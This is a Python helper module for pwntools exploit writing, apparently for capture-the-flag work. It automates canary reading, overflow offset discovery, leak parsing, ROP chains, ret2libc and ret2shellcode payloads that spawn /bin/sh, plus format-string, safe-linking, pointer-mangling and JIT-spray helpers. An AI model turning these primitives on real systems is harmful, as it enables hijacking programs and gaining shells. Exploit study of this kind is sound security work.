from pwn import (
    context,
    cyclic,
    cyclic_find,
    unpack,
    log,
    asm,
    flat,
    rol,
    ror,
    shellcraft,
    ROP,
    pwnlib,
    Coredump,
)
import pwn
import re
import math
from pwninit.io import IOContext, ioctx
from pwninit import *


class PwnContext:
    def __init__(self, io: IOContext, elf, libc, prefix=None):
        self.io = io
        self.elf = elf
        self.libc = libc
        self.prefix = prefix
        self._offset = None
        self._canary = None

    @property
    def canary(self):
        if not self._canary and self.io and self.io.proc and self.elf.canary:
            canary = 0x0
            auxv = open(f"/proc/{self.io.proc.pid}/auxv", "rb").read()
            word = context.bytes
            for i in range(0, len(auxv), 2 * word):
                a_type = u64(auxv[i : i + word])
                a_val = u64(auxv[i + word : i + 2 * word])
                if a_type == 25:  # AT_RANDOM
                    canary = u64(b"\x00" + self.io.proc.readmem(a_val + 1, 7))
                    break
            self._canary = canary
        return self._canary

    @canary.setter
    def canary(self, new_canary):
        self._canary = new_canary

    @property
    def offset(self):
        if not self._offset:
            context.delete_corefiles = True
            sl(cyclic(1000))
            self.io.poll(block=True)
            core = self.io.corefile
            self._offset = cyclic_find(core.fault_addr)
            log.info(f"offset: {self._offset}")
            reconnect()
        return self._offset

    @offset.setter
    def offset(self, new_offset):
        self._offset = new_offset

    def __find_sym(self, symbol, bin):
        if isinstance(symbol, int):
            return symbol
        elif "+" in symbol:
            func, off = symbol.split("+")
            return bin.sym[func] + int(off, 0)
        elif "-" in symbol:
            func, off = symbol.split("-")
            return bin.sym[func] - int(off, 0)
        else:
            return bin.sym[symbol]

    def resolve(self, symbol):
        if isinstance(symbol, int):
            return symbol

        for b in (self.libc, self.elf):
            try:
                addr = self.__find_sym(symbol, b)
                if addr is not None:
                    return addr
            except Exception:
                continue
        return None

    def leak(self, leak, leaked=0, name=""):
        start = leak.find(b"0x")
        base = 0

        if start >= 0:
            leak = leak[start:]
            end = 2
            for i in leak[2:]:
                try:
                    int(chr(i), 16)
                    end += 1
                except ValueError:
                    break
            leak = int(leak[:end], 16)
        else:
            if len(leak) <= 8:
                leak = upack(leak)
            else:
                if leak[-1] == 0xA:
                    leak = leak[:-1]

                for i in range(len(leak)):
                    for j in range(6, 8):
                        l = upack(leak[i : i + j])
                        found_name, found_base = self.check_leaks(l)
                        if found_name:
                            log.info(f"{found_name} found at leak[{i}:{i + j}]")
                            break
                else:
                    log.warn("cannot find leak, try another way")
                    exit(0)
                return

        leak -= leaked

        if not name:
            name, base = self.check_leaks(leak)

        if base == 0:
            base = leak

        var = getattr(self, name, False)
        if var:
            if type(getattr(var, "address", False)) is int:
                var.address = base
            else:
                setattr(self, name, base)

        if base > 0 and leak != base:
            log.info(
                f"{name}: leak = {leak:#x}, base = {base:#x}, diff = {leak - base}"
            )
        elif name:
            log.info(f"{name}: leak = {leak:#x}")
        elif not self.io:
            log.info(f"leak = {leak:#x}")
        else:
            log.warn("no leak found")

        return leak

    def check_leaks(self, leak):
        base = 0
        name = ""

        if not self.io or not self.io.proc:
            return name, base

        if hex(leak) in hex(self.canary):
            return "canary", self.canary

        for m in self.io.proc.maps():
            if m.start <= leak <= m.end:
                if self.elf.path == m.path:
                    name = "elf"
                    base = self.io.proc.elf_mapping().address
                elif self.libc.path == m.path:
                    name = "libc"
                    base = self.io.proc.libc_mapping().address
                else:
                    name = m.path.strip("/")
                    if hasattr(self.io.proc, f"{name}_mapping"):
                        base = getattr(self.io.proc, f"{name}_mapping")().address
                return name, base

        return name, base

    def ropchain(self, chain, ret=True):
        elf = self.elf
        libc = self.libc

        elfs = []
        if elf and (not elf.pie or elf.address):
            elfs.append(elf)
        if libc and (not libc.aslr or libc.address):
            elfs.append(libc)

        rop = ROP(elfs)
        if elfs and ret:
            rop.raw(rop.ret.address)

        for func, params in chain.items():
            if isinstance(func, str) and "+" in func:
                f, off = func.split("+")
                func = self.resolve(f) + int(off)
            if not isinstance(params, dict):
                rop.call(func, params)
            else:
                for value, gadget in rop.setRegisters(params):
                    if isinstance(gadget, pwnlib.rop.gadgets.Gadget):
                        rop.raw(gadget)
                    else:
                        rop.raw(value)
                rop.call(func)

        rop.raw(rop.ret.address)
        log.info(f"ROP :\n{rop.dump()}")
        return rop.chain()

    def bof(self, data, opt=None, bp=None, **kwargs):
        offset = self.offset
        canary = self.canary

        if opt is None:
            opt = {}

        if canary:
            opt |= {offset: canary}
            offset += context.bytes

        if bp:
            opt |= {offset: bp}
            offset += context.bytes

        return flat({offset: data} | opt)

    def ret2shellcode(self, addr, **kwargs):
        shellcode = asm(shellcraft.sh())
        stub = asm("sub esp, 0x1000") if context.bits == 32 else asm("sub rsp, 0x1000")
        shellcode = stub + shellcode
        padding_len = (
            self.offset - context.bytes * (self.elf.canary + 1) - len(shellcode)
        )
        padding = asm("nop") * padding_len
        addr += len(padding) // 2
        payload = self.ropchain({addr: []})
        return self.bof(payload, opt={0: [padding, shellcode]}, **kwargs)

    def ret2win(self, win, params=[], **kwargs):
        addr = self.resolve(win)
        payload = self.ropchain({addr: params}, **kwargs)
        return self.bof(payload, **kwargs)

    def ret2libc(self, **kwargs):
        system = self.libc.sym["system"]
        bin_sh = next(self.libc.search(b"/bin/sh\x00"))
        payload = self.ropchain({system: [bin_sh]})
        return self.bof(payload, **kwargs)

    def ret2plt(self, func="puts", ret2main="main", **kwargs):
        func_plt = self.elf.plt[func]
        func_got = self.elf.got[func]
        if ret2main:
            main = self.resolve(ret2main)
            payload = self.ropchain({func_plt: [func_got], main: []})
        else:
            payload = self.ropchain({func_plt: [func_got]})
        self.bof(payload, **kwargs)
        leak = upack(self.io.recv())
        self.libc.address = leak - self.libc.sym[func]

    def format_string(self, n=100):
        payload = "A" * context.bytes + ".%p" * n
        self.io.send(payload)
        output = self.io.recv().split(".")
        log.info(f"format string : {output}")
        return output.index("0x" + "41" * context.bytes)

    def binsh(self):
        return next(self.libc.search(b"/bin/sh\0"))


pwnctx = None


def set_ctx(new_ctx: PwnContext):
    global pwnctx
    pwnctx = new_ctx


def _require_ctx():
    if pwnctx is None:
        raise RuntimeError("PwnContext not initialized — call set_ctx() first")


def _ctx(name):
    """Forward a method call to pwnctx."""

    def wrapper(*args, **kwargs):
        _require_ctx()
        return getattr(pwnctx, name)(*args, **kwargs)

    wrapper.__name__ = name
    return wrapper


def _ctx_prop(name):
    """Forward a property access to pwnctx."""

    def wrapper():
        _require_ctx()
        return getattr(pwnctx, name)

    wrapper.__name__ = name
    return wrapper


leak = _ctx("leak")
resolve = _ctx("resolve")
check_leaks = _ctx("check_leaks")
ropchain = _ctx("ropchain")
bof = _ctx("bof")
ret2shellcode = _ctx("ret2shellcode")
ret2win = _ctx("ret2win")
ret2libc = _ctx("ret2libc")
ret2plt = _ctx("ret2plt")
format_string = _ctx("format_string")
binsh = _ctx("binsh")

offset = _ctx_prop("offset")
canary = _ctx_prop("canary")


u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
upack = lambda d: unpack(d.ljust(context.bits // 8, b"\x00"), context.bits)


def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or len(a) == 0:
        a_ = 0
    b_ = d.find(b, a_ + len(a))
    if b_ == -1 or len(b) == 0:
        b_ = len(d)
    return d[a_ + len(a) : b_]


def getr(d, p):
    return re.findall(p, d)[0]


def safelink_bf64(ptr):
    r"""safelink_bf64(ptr) -> int

    Recover a safelinked next pointer assuming both next & addr are in the same page.

    Arguments:
        ptr(int): The next value
    """
    fd = 0
    for i in range(36, -1, -12):
        tmp = fd
        fd <<= 12
        fd |= (tmp ^ (ptr >> i)) & 0xFFF
    if fd & 0xF != 0:
        log.warn("safelink_bf64(): page differs")
    return fd


def printx(**kwargs):
    for k, v in kwargs.items():
        log.success("%s: %#x" % (k, v))


def hexdump(data, s=context.word_size // 8):
    idx_max = math.ceil(math.log(len(data), 16))
    for i in range(0, len(data), s):
        log.info(f"%0{idx_max}x: %#0{2 * s + 2}x" % (i, u64(data[i : i + s])))


def safelink(addr, ptr):
    return (addr >> 12) ^ ptr


def ptr_mangle(addr, cookie=0):
    return rol(addr ^ cookie, 17)


def ptr_demangle(addr, cookie=0):
    return ror(addr, 17) ^ cookie


def ptr_cookie(mangled, demangled):
    return ptr_demangle(mangled, demangled)


def jitspray(code, size=8, jmp=b"\xeb\x03"):
    r"""jitspray(code, size=8, jmp=b"\\xeb\\x03") -> list

    Perform a jitspray with movabs on x64 by default.

    Arguments:
        code(str):  Assembler code
        size(int):  Maximum code part size (default 8 for movabs)
        jmp(bytes): Stub for jumping between code parts
    """
    code = [asm(c) for c in code.splitlines()]
    size -= len(jmp)
    parts = [b""]
    for c in code:
        if len(c) > size:
            log.error(
                f"jitspray(): code part {c.hex()} too long for maximum size {size}"
            )
        p = parts[-1]
        if len(p) + len(c) > size:
            parts[-1] = p.ljust(size, b"\x90") + jmp
            parts.append(c)
        else:
            parts[-1] += c
    return [u64(p) for p in parts]
